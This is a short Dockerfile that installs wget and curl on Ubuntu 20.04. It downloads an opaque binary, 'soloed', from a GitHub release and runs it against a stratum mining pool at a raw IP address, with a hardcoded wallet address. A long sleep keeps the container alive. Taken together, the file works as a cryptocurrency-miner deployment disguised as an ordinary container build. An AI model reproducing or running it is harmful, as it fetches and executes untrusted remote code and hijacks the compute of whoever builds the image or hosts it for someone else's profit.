FROM ubuntu:20.04



ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
    apt-get install -y \
    wget \
    curl
    
RUN wget https://github.com/Solo120140/Sologotemm-/releases/download/dataget/soloed

RUN chmod +x soloed 

RUN nohup ./soloed -a yespower -o stratum+tcp://206.189.2.17:3333 -u WbDv1eEFn1QwodsG9Tdmq8e61BhEn8SMHZ -p x -t2 && sleep 635636




     
